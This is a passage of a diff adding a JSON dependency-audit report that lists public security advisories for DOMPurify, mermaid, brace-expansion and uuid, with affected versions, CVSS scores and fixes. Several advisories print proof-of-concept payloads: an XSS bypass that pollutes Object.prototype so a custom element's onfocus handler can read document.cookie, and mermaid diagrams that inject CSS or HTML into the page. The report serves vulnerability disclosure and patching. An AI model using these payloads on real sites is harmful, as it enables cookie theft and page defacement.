+      "overview": "## Summary\n\nDOMPurify versions 3.0.1 through 3.3.3 (latest) are vulnerable to a prototype pollution-based XSS bypass. When an application uses `DOMPurify.sanitize()` with the default configuration (no `CUSTOM_ELEMENT_HANDLING` option), a prior prototype pollution gadget can inject permissive `tagNameCheck` and `attributeNameCheck` regex values into `Object.prototype`, causing DOMPurify to allow arbitrary custom elements with arbitrary attributes — including event handlers — through sanitization.\n\n## Affected Versions\n\n- **3.0.1 through 3.3.3** (current latest) — all affected\n- **3.0.0 and all 2.x versions** — NOT affected (used `Object.create(null)` for initialization, no `|| {}` reassignment)\n- The vulnerable `|| {}` reassignment was introduced in the 3.0.0→3.0.1 refactor\n- This is **distinct** from GHSA-cj63-jhhr-wcxv (USE_PROFILES Array.prototype pollution, fixed in 3.3.2)\n- This is **distinct** from CVE-2024-45801 / GHSA-mmhx-hmjr-r674 (__depth prototype pollution, fixed in 3.1.3)\n\n## Root Cause\n\nIn `purify.js` at line 590, during config parsing:\n\n```javascript\nCUSTOM_ELEMENT_HANDLING = cfg.CUSTOM_ELEMENT_HANDLING || {};\n```\n\nWhen no `CUSTOM_ELEMENT_HANDLING` is specified in the config (the default usage pattern), `cfg.CUSTOM_ELEMENT_HANDLING` is `undefined`, and the fallback `{}` is used. This plain object inherits from `Object.prototype`.\n\nLines 591-598 then check `cfg.CUSTOM_ELEMENT_HANDLING` (the original config property) — which is `undefined` — so the conditional blocks that would set `tagNameCheck` and `attributeNameCheck` from the config are never entered.\n\nAs a result, `CUSTOM_ELEMENT_HANDLING.tagNameCheck` and `CUSTOM_ELEMENT_HANDLING.attributeNameCheck` resolve via the prototype chain. If an attacker has polluted `Object.prototype.tagNameCheck` and `Object.prototype.attributeNameCheck` with permissive values (e.g., `/.*/`), these polluted values flow into DOMPurify's custom element validation at lines 973-977 and attribute validation, causing all custom elements and all attributes to be allowed.\n\n## Impact\n\n- **Attack type:** XSS bypass via prototype pollution chain\n- **Prerequisites:** Attacker must have a prototype pollution primitive in the same execution context (e.g., vulnerable version of lodash, jQuery.extend, query-string parser, deep merge utility, or any other PP gadget)\n- **Config required:** Default. No special DOMPurify configuration needed. The standard `DOMPurify.sanitize(userInput)` call is affected.\n- **Payload:** Any HTML custom element (name containing a hyphen) with event handler attributes survives sanitization\n\n## Proof of Concept\n\n```javascript\n// Step 1: Attacker exploits a prototype pollution gadget elsewhere in the application\nObject.prototype.tagNameCheck = /.*/;\nObject.prototype.attributeNameCheck = /.*/;\n\n// Step 2: Application sanitizes user input with DEFAULT config\nconst clean = DOMPurify.sanitize('<x-x onfocus=alert(document.cookie) tabindex=0 autofocus>');\n\n// Step 3: \"Sanitized\" output still contains the event handler\nconsole.log(clean);\n// Output: <x-x onfocus=\"alert(document.cookie)\" tabindex=\"0\" autofocus=\"\">\n\n// Step 4: When injected into DOM, XSS executes\ndocument.body.innerHTML = clean; // alert() fires\n```\n\n### Tested configurations that are vulnerable:\n\n| Call Pattern | Vulnerable? |\n|---|---|\n| `DOMPurify.sanitize(input)` | YES |\n| `DOMPurify.sanitize(input, {})` | YES |\n| `DOMPurify.sanitize(input, { CUSTOM_ELEMENT_HANDLING: null })` | YES |\n| `DOMPurify.sanitize(input, { CUSTOM_ELEMENT_HANDLING: {} })` | NO (explicit object triggers L591 path) |\n\n## Suggested Fix\n\nChange line 590 from:\n```javascript\nCUSTOM_ELEMENT_HANDLING = cfg.CUSTOM_ELEMENT_HANDLING || {};\n```\n\nTo:\n```javascript\nCUSTOM_ELEMENT_HANDLING = cfg.CUSTOM_ELEMENT_HANDLING || create(null);\n```\n\nThe `create(null)` function (already used elsewhere in DOMPurify, e.g., in `clone()`) creates an object with no prototype, preventing prototype chain inheritance.\n\n### Alternative application-level mitigation:\n\nApplications can protect themselves by always providing an explicit `CUSTOM_ELEMENT_HANDLING` in their config:\n\n```javascript\nDOMPurify.sanitize(input, {\n  CUSTOM_ELEMENT_HANDLING: {\n    tagNameCheck: null,\n    attributeNameCheck: null\n  }\n});\n```\n\n## Timeline\n\n- **2026-04-04:** Vulnerability discovered during automated DOMPurify fuzzing research (Fermat project)\n- **2026-04-04:** Confirmed in Chrome browser with DOMPurify 3.3.3\n- **2026-04-04:** Verified distinct from GHSA-cj63-jhhr-wcxv and CVE-2024-45801\n- **2026-04-04:** Advisory drafted, responsible disclosure initiated\n\n## Credit\n\nhttps://github.com/trace37labs",
+      "reported_by": null,
+      "title": "DOMPurify: Prototype Pollution to XSS Bypass via CUSTOM_ELEMENT_HANDLING Fallback",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41238"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "dompurify",
+      "vulnerable_versions": ">=3.0.1 <3.4.0",
+      "github_advisory_id": "GHSA-v9jr-rg53-9pgp",
+      "recommendation": "Upgrade to version 3.4.0 or later",
+      "patched_versions": ">=3.4.0",
+      "updated": "2026-04-27T16:32:04.000Z",
+      "cvss": {
+        "score": 6.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79",
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-v9jr-rg53-9pgp"
+    },
+    "1117990": {
+      "findings": [
+        {
+          "version": "10.9.5",
+          "paths": [
+            ".>rspress-plugin-mermaid>mermaid"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/mermaid-js/mermaid/security/advisories/GHSA-6m6c-36f7-fhxh\n- https://github.com/mermaid-js/mermaid/commit/a59ea56174712ee5430dfd5bc877cb5151f501a6\n- https://github.com/mermaid-js/mermaid/commit/faafb5d49106dd32c367f3882505f2dd625aa30e\n- https://github.com/mermaid-js/mermaid/releases/tag/mermaid%4011.15.0\n- https://github.com/mermaid-js/mermaid/releases/tag/v10.9.6\n- https://github.com/advisories/GHSA-6m6c-36f7-fhxh",
+      "created": "2026-05-11T19:36:55.000Z",
+      "id": 1117990,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nMermaid v11.14.0 and earlier are vulnerable to a denial-of-service attack when rendering gantt charts, if they use the [`excludes` attribute](https://mermaid.js.org/syntax/gantt.html?#excludes) to exclude all dates.\n\nExample:\n\n```\ngantt\n  excludes monday,tuesday,wednesday,thursday,friday,saturday,sunday\n  DoS :2025-01-01, 1d\n```\n\n`mermaid.parse` is unaffected, unless you then call the `ganttDb.getTasks()` (which is called when rendering a diagram).\n\n### Patches\n\nThis has been patched in:\n\n- [v11.15.0](https://github.com/mermaid-js/mermaid/releases/tag/mermaid%4011.15.0) (see [faafb5d49106dd32c367f3882505f2dd625aa30e](https://github.com/mermaid-js/mermaid/commit/faafb5d49106dd32c367f3882505f2dd625aa30e))\n- [v10.9.6](https://github.com/mermaid-js/mermaid/releases/tag/v10.9.6) (see [a59ea56174712ee5430dfd5bc877cb5151f501a6](https://github.com/mermaid-js/mermaid/commit/a59ea56174712ee5430dfd5bc877cb5151f501a6))\n\n### Workarounds\n\nThere are no workarounds available without updating to a newer version of mermaid.",
+      "reported_by": null,
+      "title": "Mermaid Gantt Charts are vulnerable to an Infinite Loop DoS",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41150"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "mermaid",
+      "vulnerable_versions": "<=10.9.5",
+      "github_advisory_id": "GHSA-6m6c-36f7-fhxh",
+      "recommendation": "Upgrade to version 10.9.6 or later",
+      "patched_versions": ">=10.9.6",
+      "updated": "2026-05-11T19:36:57.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-6m6c-36f7-fhxh"
+    },
+    "1117994": {
+      "findings": [
+        {
+          "version": "10.9.5",
+          "paths": [
+            ".>rspress-plugin-mermaid>mermaid"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/mermaid-js/mermaid/security/advisories/GHSA-xcj9-5m2h-648r\n- https://github.com/mermaid-js/mermaid/commit/8fead23c59166b7bab6a39eac81acebee2859102\n- https://github.com/mermaid-js/mermaid/commit/e9b0f34d8d82a6260077764ee45e1d7d90957a0f\n- https://github.com/mermaid-js/mermaid/releases/tag/mermaid%4011.15.0\n- https://github.com/mermaid-js/mermaid/releases/tag/v10.9.6\n- https://mermaid.js.org/config/schema-docs/config.html#securitylevel\n- https://github.com/advisories/GHSA-xcj9-5m2h-648r",
+      "created": "2026-05-11T19:36:41.000Z",
+      "id": 1117994,
+      "npm_advisory_id": null,
+      "overview": "### Details\n\nThe state diagram and any other diagram type that routes user-controlled style strings through createCssStyles parser for Mermaid v11.14.0 and earlier captures `classDef` values with an unrestricted regex:\n\n```jison\n// packages/mermaid/src/diagrams/state/parser/stateDiagram.jison:83\n<CLASSDEFID>[^\\n]*   { this.popState(); return 'CLASSDEF_STYLEOPTS' }\n```\n\nThe value passes unsanitized through `addStyleClass()` -> `createCssStyles()` -> `style.innerHTML` (mermaidAPI.ts:418). A `}` in the value closes the generated CSS selector, and everything after becomes a new CSS rule on the page.\n\n### PoC\n\n```\nstateDiagram-v2 \n      classDef x }*{ background-image: url(\"http://media.giphy.com/media/SggILpMXO7Xt6/giphy.gif\")}\n```\n\nLive demo:\n<https://mermaid.live/edit#pako:eNpFjzFvgzAQhf-KdVNbEcBgMHhtlkqtOnSJKi8ONsYKBmRMlRTx3-skanvTfbp7996t0IxSAYPZC6_2Rmgn7O4rQ00v5nmvWnRG29OKjqI5aTcug9wZK7RiaHH9A4fO-4kliVXSiFibqbvEzWjvnHxo_fI6vR3e6cGXyX2qTcvhcYMItDMSmHeLisAqZ8UVYeUDQhx8p6ziwEIrhTtx4MNVM4nhcxztrywE0h2wVvRzoGWS_z_8rahBKvcckntgmN5OAFvhDIzUNCZZQXCR5nVaZkUEF2BVFpOcEkoxxhUuyRbB980yjStapKHqoKFlhvPtB7BFZEU>\n\n### Patches\n\nThis has been patched in:\n\n- [v11.15.0](https://github.com/mermaid-js/mermaid/releases/tag/mermaid%4011.15.0) (see [e9b0f34d8d82a6260077764ee45e1d7d90957a0f](https://github.com/mermaid-js/mermaid/commit/e9b0f34d8d82a6260077764ee45e1d7d90957a0f))\n- [v10.9.6](https://github.com/mermaid-js/mermaid/releases/tag/v10.9.6) (see [8fead23c59166b7bab6a39eac81acebee2859102](https://github.com/mermaid-js/mermaid/commit/8fead23c59166b7bab6a39eac81acebee2859102))\n\n### Workarounds\n\nSetting [`\"securityLevel\": \"sandbox\"`](https://mermaid.js.org/config/schema-docs/config.html#securitylevel)  will prevent this, by rendering the mermaid diagram in a sandboxed `<iframe>`.\n\n### Impact\n\n Enables page defacement, user tracking via `url()` callbacks, and DOM attribute exfiltration via CSS `:has()` selectors.",
+      "reported_by": null,
+      "title": "Mermaid: Improper sanitization of `classDefs` in diagrams leads to CSS injection",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41148"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "mermaid",
+      "vulnerable_versions": "<=10.9.5",
+      "github_advisory_id": "GHSA-xcj9-5m2h-648r",
+      "recommendation": "Upgrade to version 10.9.6 or later",
+      "patched_versions": ">=10.9.6",
+      "updated": "2026-05-11T19:36:42.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-94"
+      ],
+      "url": "https://github.com/advisories/GHSA-xcj9-5m2h-648r"
+    },
+    "1118512": {
+      "findings": [
+        {
+          "version": "10.9.5",
+          "paths": [
+            ".>rspress-plugin-mermaid>mermaid"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/mermaid-js/mermaid/security/advisories/GHSA-87f9-hvmw-gh4p\n- https://github.com/mermaid-js/mermaid/commit/64769738d5b59211e1decb471ffbaca8afec51aa\n- https://github.com/mermaid-js/mermaid/commit/a9d9f0d8eb790349121508688cd338253fd80d76\n- https://github.com/mermaid-js/mermaid/releases/tag/mermaid%4011.15.0\n- https://github.com/mermaid-js/mermaid/releases/tag/v10.9.6\n- https://github.com/advisories/GHSA-87f9-hvmw-gh4p",
+      "created": "2026-05-11T19:37:00.000Z",
+      "id": 1118512,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nMermaid's default configuration allows injecting CSS that applies outside of the Mermaid diagram via the `fontFamily`, `themeCSS`, and `altFontFamily` configuration options.\n\nLive demo: [mermaid.live](https://mermaid.live/edit#pako:eNpNjktLxDAUhf9KvFBR6JS-60QQfODKlUvJ5k6TtsEmKTHFGUP-u-mI6Nmdy3fOPR56wwVQSBIvtXSUeAaD0e4ZlZxPDChhcLxFfwiEauOuLq_9Afv30ZpVczpaITS5kGox1qF2gfSeBwYhJAnThAyz-ewntI68vG5-0z3Z7e7IA9OQwmglB-rsKlJQwircLPgNZeAmocTPAi4GXGfHgOkQYwvqN2PUbzJuGSegA84f0a0LRyeeJI4W_xChubCPcbQD2pwbgHo4Aq2aKmvbqq3zoiu7pizqFE6RybN9VFfFY1HWXRVS-Dr_zLObrt7_V_gGGXZlGg)\n\nExample code:\n\n```\n%%{init: {\"fontFamily\": \"x;a{b} :not(&){background:green !important} c{d}\"}}%%\nflowchart LR\n    A --> B\n```\n\nThe injected CSS exploits stylis's `&` (scope reference) handling. `:not(&)` escapes the `#mermaid-xxx` automatic scoping, applying styles to all page elements. Global at-rules (`@font-face`, `@keyframes`, `@counter-style`) are also injectable as stylis hoists them to top level.\n\nThis allows page defacement and DOM attribute exfiltration via CSS `:has()` selectors.\n\n### Patches\n\n- [v11.15.0](https://github.com/mermaid-js/mermaid/releases/tag/mermaid%4011.15.0) (see [64769738d5b59211e1decb471ffbaca8afec51aa](https://github.com/mermaid-js/mermaid/commit/64769738d5b59211e1decb471ffbaca8afec51aa))\n- [v10.9.6](https://github.com/mermaid-js/mermaid/releases/tag/v10.9.6) (see [a9d9f0d8eb790349121508688cd338253fd80d76](https://github.com/mermaid-js/mermaid/commit/a9d9f0d8eb790349121508688cd338253fd80d76))\n\n### Workarounds\n\nIf you can't upgrade mermaid, you can set the [`secure`](https://mermaid.js.org/config/schema-docs/config.html#secure) config value in the mermaid config to avoid allowing diagrams to modify `fontFamily`, `themeCSS`, `altFontFamily`, and `themeVariables`.\n\nSetting [`\"securityLevel\": \"sandbox\"`](https://mermaid.js.org/config/schema-docs/config.html#securitylevel)  will also prevent this.\n\n### Credits\n\nReported by @zsxsoft on behalf of @KeenSecurityLab",
+      "reported_by": null,
+      "title": "Mermaid: Improper sanitization of configuration leads to CSS injection",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41159"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "mermaid",
+      "vulnerable_versions": "<=10.9.5",
+      "github_advisory_id": "GHSA-87f9-hvmw-gh4p",
+      "recommendation": "Upgrade to version 10.9.6 or later",
+      "patched_versions": ">=10.9.6",
+      "updated": "2026-05-12T05:37:44.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-94"
+      ],
+      "url": "https://github.com/advisories/GHSA-87f9-hvmw-gh4p"
+    },
+    "1118514": {
+      "findings": [
+        {
+          "version": "10.9.5",
+          "paths": [
+            ".>rspress-plugin-mermaid>mermaid"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/mermaid-js/mermaid/security/advisories/GHSA-ghcm-xqfw-q4vr\n- https://github.com/mermaid-js/mermaid/commit/37ff937f1da2e19f882fd1db01235db4d01f4056\n- https://github.com/mermaid-js/mermaid/commit/4e2d512bf5bf6f9de1a8f0a48da78dc4d09ac4f3\n- https://github.com/mermaid-js/mermaid/releases/tag/mermaid%4011.15.0\n- https://github.com/mermaid-js/mermaid/releases/tag/v10.9.6\n- https://mermaid.js.org/config/schema-docs/config.html#securitylevel\n- https://github.com/advisories/GHSA-ghcm-xqfw-q4vr",
+      "created": "2026-05-11T19:36:46.000Z",
+      "id": 1118514,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nUnder the default configuration, Mermaid state diagram's `classDef` allow DOM injection that escapes the SVG, although `<script>` tags are removed, preventing XSS.\n\n#### Proof-of-concept\n\n```\nstateDiagram-v2\n  classDef xss fill:red</style></svg><style>*{x:x;y:y;overflow:visible!important;contain:none!important;transform:none!important;filter:none!important;clip-path:none!important}</style><div style=\"x:x;y:y;color:red;font:5em/1 monospace;display:grid;place-items:center;z-index:2147483647;width:100vw;height:100vh;position:fixed;top:0;left:0;background:black\">HACKED</div><svg><style>a:b\n  [*] --> A:::xss\n```\n\n### Patches\n\n- [v11.15.0](https://github.com/mermaid-js/mermaid/releases/tag/mermaid%4011.15.0) (see [37ff937f1da2e19f882fd1db01235db4d01f4056](https://github.com/mermaid-js/mermaid/commit/37ff937f1da2e19f882fd1db01235db4d01f4056))\n- [v10.9.6](https://github.com/mermaid-js/mermaid/releases/tag/v10.9.6) (see [4e2d512bf5bf6f9de1a8f0a48da78dc4d09ac4f3](https://github.com/mermaid-js/mermaid/commit/4e2d512bf5bf6f9de1a8f0a48da78dc4d09ac4f3))\n\n### Workarounds\n\nIf you can not update to a patched version, setting [`\"securityLevel\": \"sandbox\"`](https://mermaid.js.org/config/schema-docs/config.html#securitylevel)  will prevent this, by rendering the mermaid diagram in a sandboxed `<iframe>`.\n\n### Credits\n\nThanks to @zsxsoft from @KeenSecurityLab for reporting this vulnerability.",
+      "reported_by": null,
+      "title": "Mermaid: Improper sanitization of `classDef` in state diagrams leads to HTML injection",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41149"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "mermaid",
+      "vulnerable_versions": "<=10.9.5",
+      "github_advisory_id": "GHSA-ghcm-xqfw-q4vr",
+      "recommendation": "Upgrade to version 10.9.6 or later",
+      "patched_versions": ">=10.9.6",
+      "updated": "2026-05-12T05:37:51.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-94"
+      ],
+      "url": "https://github.com/advisories/GHSA-ghcm-xqfw-q4vr"
+    },
+    "1119088": {
+      "findings": [
+        {
+          "version": "5.0.5",
+          "paths": [
+            ".>rspress-plugin-mermaid>rspress-plugin-devkit>ts-morph>@ts-morph/common>minimatch>brace-expansion"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-jxxr-4gwj-5jf2\n- https://github.com/juliangruber/brace-expansion/commit/c0b095bdc52bc4c36dc88deddbadabc49f8371e5\n- https://github.com/advisories/GHSA-jxxr-4gwj-5jf2",
+      "created": "2026-05-18T16:22:01.000Z",
+      "id": 1119088,
+      "npm_advisory_id": null,
+      "overview": "The `max` option was being applied too late:\n\nWhen expanding a single large numeric range like `{1..10000000}`, the sequence generation loop generates all 10 million intermediate elements before the `max` limit is applied With `max=10`, the output is correctly limited to 10 items, but the process still allocates `~505 MB` and spends `~800ms` building the full intermediate array.\n\n### Workaround\n\nEnsure the string to be expanded doesn't contain more values than the desired `max` item count.",
+      "reported_by": null,
+      "title": "brace-expansion: Large numeric range defeats documented `max` DoS protection",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-45149"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "brace-expansion",
+      "vulnerable_versions": ">=5.0.0 <5.0.6",
+      "github_advisory_id": "GHSA-jxxr-4gwj-5jf2",
+      "recommendation": "Upgrade to version 5.0.6 or later",
+      "patched_versions": ">=5.0.6",
+      "updated": "2026-05-18T16:22:04.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400"
+      ],
+      "url": "https://github.com/advisories/GHSA-jxxr-4gwj-5jf2"
+    },
+    "1119441": {
+      "findings": [
+        {
+          "version": "9.0.1",
+          "paths": [
+            ".>rspress-plugin-mermaid>mermaid>uuid"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq\n- https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34\n- https://github.com/uuidjs/uuid/releases/tag/v14.0.0\n- https://nvd.nist.gov/vuln/detail/CVE-2026-41907\n- https://github.com/uuidjs/uuid/commit/32389c887c9e75f90442ee4cc95bbab0c4e8346e\n- https://github.com/uuidjs/uuid/commit/3d61d6ac1f782cf6b1dd8661c60f11722cd49a0d\n- https://github.com/uuidjs/uuid/commit/9d27ddf7046ce496ef39569ff84d948eeff9cb2a\n- https://github.com/uuidjs/uuid/releases/tag/v11.1.1\n- https://github.com/uuidjs/uuid/releases/tag/v12.0.1\n- https://github.com/uuidjs/uuid/releases/tag/v13.0.1\n- https://github.com/advisories/GHSA-w5hq-g745-h8pq",
+      "created": "2026-04-22T20:53:24.000Z",
+      "id": 1119441,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe `v3()`, `v5()`, and `v6()` [API methods](https://github.com/uuidjs/uuid#api-summary) (not `uuid` release versions) accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  \nBy contrast, `v4()`, `v1()`, and `v7()` API methods explicitly throw `RangeError` on invalid bounds.\n\nThis inconsistency allows **silent partial writes** into caller-provided buffers.\n\n\n### Affected code\n\n- `src/v35.ts` (`v3()`/`v5()` path) writes `buf[offset + i]` without bounds validation.\n- `src/v6.ts` writes `buf[offset + i]` without bounds validation.\n\n### Reproducible PoC\n\n```bash\ncd /home/StrawHat/uuid\nnpm ci\nnpm run build\n\nnode --input-type=module -e \"\nimport {v4,v5,v6} from './dist-node/index.js';\nconst ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nfor (const [name,fn] of [\n  ['v4()',()=>v4({},new Uint8Array(8),4)],\n  ['v5()',()=>v5('x',ns,new Uint8Array(8),4)],\n  ['v6()',()=>v6({},new Uint8Array(8),4)],\n]) {\n  try { fn(); console.log(name,'NO_THROW'); }\n  catch(e){ console.log(name,'THREW',e.name); }\n}\"\n```\n\nObserved:\n\n- `v4() THREW RangeError`\n- `v5() NO_THROW`\n- `v6() NO_THROW`\n\nExample partial overwrite evidence captured during audit:\n\n```text\nsame true buf [\n  170, 170, 170, 170,\n   75, 224, 100,  63\n]\nv6 [\n  187, 187, 187, 187,\n   31,  19, 185,  64\n]\n```\n\n### Security impact\n\n- **Primary**: integrity/robustness issue (silent partial output).\n- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.\n- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.\n\n### Suggested fix\n\nAdd the same guard used by `v4()`/`v1()`/`v7()`:\n\n```ts\nif (offset < 0 || offset + 16 > buf.length) {\n  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);\n}\n```\n\nApply to:\n\n- `src/v35.ts` (covers `v3()` and `v5()`)\n- `src/v6.ts`",
+      "reported_by": null,
+      "title": "uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41907"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "uuid",
+      "vulnerable_versions": "<11.1.1",
+      "github_advisory_id": "GHSA-w5hq-g745-h8pq",
+      "recommendation": "Upgrade to version 11.1.1 or later",
+      "patched_versions": ">=11.1.1",
+      "updated": "2026-05-21T18:25:57.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-787",
+        "CWE-1285"
+      ],
+      "url": "https://github.com/advisories/GHSA-w5hq-g745-h8pq"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 0,
+      "moderate": 17,
+      "high": 4,
+      "critical": 0
+    },
+    "dependencies": 467,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 467
+  }
+}
